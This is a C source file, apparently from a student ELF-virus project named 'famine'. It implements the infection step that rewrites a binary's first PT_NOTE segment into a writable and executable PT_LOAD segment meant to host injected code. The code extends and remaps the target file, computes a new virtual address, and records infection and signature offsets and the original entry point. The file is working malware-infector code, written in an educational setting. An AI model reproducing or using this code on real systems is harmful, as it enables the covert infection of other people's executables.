/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   note_segment.c                                     :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: nguiard <nguiard@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/11/06 09:45:03 by nguiard           #+#    #+#             */
/*   Updated: 2024/11/25 15:56:00 by nguiard          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

static Elf64_Phdr	*exec_segment(elf_data *data);
static bool			find_pvaddr(elf_data *data, Elf64_Phdr *note, size_t new_seg_size);

//	Changes the first PT_NOTE segment into an executable segment that will host our code
//
//	Returns true on error
bool	change_note_segment(profiling *this, elf_data *data) {
	size_t		note_index = 0;
	int64_t		ret = 0;
	uint64_t	new_seg_size;
	Elf64_Phdr	*note = NULL;
	Elf64_Phdr	*exec = NULL;
	size_t		note_size;

	(void)this;
	(void)ret;

	for (size_t i = 0; i < data->elf->e_phnum; i++) {
		note = &data->segments[i];

		if (note->p_type == PT_NOTE) {
			note_index = i;
			break;
		}
	}

	(void)note_size;

	
	note_size = note->p_filesz;

	new_seg_size = note->p_filesz + this->size + SIGNATURE_OFFSET + SIGNATURE_LEN;
	new_seg_size += 0x1000 - (new_seg_size % 0x1000);

	// Extend
	ftruncate(ret, data->fd, data->original_size + new_seg_size + 0x1000 - (data->original_size % 0x1000));
	if (ret < 0) {
		return true;
	}
	mremap(ret, data->file, data->original_size,
		data->original_size + new_seg_size + 0x1000 - (data->original_size % 0x1000), MREMAP_MAYMOVE);
	if (ret >= -22 && ret < 0) {
		return true;
	}

	//	Resetting data fields to match the new mmap
	data->file = (byte *)ret;
	data->elf = (Elf64_Ehdr *)data->file;
	data->sections = (Elf64_Shdr *)(data->file + data->elf->e_shoff);
	data->segments = (Elf64_Phdr *)(data->file + data->elf->e_phoff);

	//	The important segments
	note = &data->segments[note_index];
	exec = exec_segment(data);
	(void)exec;

	//	Changing the values of the PT_NOTE header
	if (find_pvaddr(data, note, new_seg_size))
		return true;
	
	note->p_type   = PT_LOAD;
	note->p_flags  = PF_R | PF_X | PF_W | PF_FAMINE;
	note->p_filesz += this->size + SIGNATURE_OFFSET + SIGNATURE_LEN;
	note->p_memsz  = note->p_filesz;
	note->p_offset = data->original_size + 0x1000 - (data->original_size % 0x1000);
	note->p_align  = exec->p_align;
	
	//	Adding elf_data
	data->infection_offset_file = note->p_offset + note_size; 
	data->infection_offset_mem  = note->p_vaddr + note_size;

	data->signature_offset_file = data->infection_offset_file + SIGNATURE_OFFSET;
	data->signature_offset_mem  = data->infection_offset_mem + SIGNATURE_OFFSET;

	return false;
}

static bool	find_pvaddr(elf_data *data, Elf64_Phdr *note, size_t new_seg_size) {
	Elf64_Phdr	*seg = NULL;
	size_t		vmax = 0;
	size_t		pmax = 0;
	size_t		current = 0;

	for (size_t i = 0; i < data->elf->e_phnum; i++) {
		seg = &data->segments[i];
	
		current = seg->p_vaddr + (((seg->p_filesz / seg->p_align) + 1) * seg->p_align);
		if (current > vmax) {
			vmax = current;
		}
		
		current = seg->p_paddr + (((seg->p_filesz / seg->p_align) + 1) * seg->p_align);
		if (current > pmax) {
			pmax = current;
		}
	}

	vmax = ((vmax / 0x1000) + 1) * 0x1000;
	pmax = ((pmax / 0x1000) + 1) * 0x1000;

	current = vmax + new_seg_size;
	if (current < vmax) {
		return true;
	}
	current = pmax + new_seg_size;
	if (current < pmax) {
		return true;
	}

	note->p_vaddr = vmax;
	note->p_paddr = pmax;

	return false;
}

static Elf64_Phdr	*exec_segment(elf_data *data) {
	Elf64_Shdr	*section = NULL;
	Elf64_Phdr	*segment = NULL;
	uint64_t	dot_text = 0x00747865742e; // ".text"

	for (size_t i = 0; i < data->elf->e_shnum; i++) {
		section = &data->sections[i];

		if (ft_memcmp((byte *)&dot_text,
				data->file + data->sections[data->elf->e_shstrndx].sh_offset + section->sh_name,
				6)
			== true)
		{
			data->original_entry_point_file = section->sh_offset;
			for (i = 0; i < data->elf->e_phnum; i++) {
				segment = &data->segments[i];
				size_t	segment_end = segment->p_offset + segment->p_filesz;

				if (segment_end % segment->p_align != 0)
					segment_end += segment->p_align - (segment_end % segment->p_align);

				if (segment->p_type == PT_LOAD &&
					(segment->p_flags == (PF_X | PF_R)) &&
					segment->p_offset <= section->sh_offset &&
					segment_end > (section->sh_offset + section->sh_size))
				{
					return segment;
				}
			}
		}
	}

	return NULL;
}
